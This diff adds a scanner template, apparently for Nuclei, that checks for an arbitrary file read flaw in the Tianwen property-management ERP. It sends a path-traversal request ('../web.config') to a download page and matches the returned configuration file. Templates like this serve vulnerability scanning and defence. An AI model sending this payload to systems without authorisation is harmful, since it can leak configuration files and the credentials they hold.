@@ -1,0 +1,27 @@
+id: poc-yaml-tianwen-wuye-erp-vacantdiscountdownLoad-aspx-anyfile-read
+info:
+  name: 天问物业ERP系统 VacantDiscountDownLoad 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/HM/M_main/InformationManage/VacantDiscountDownLoad.aspx?VacantDiscountFile=../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "filename=web.config"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
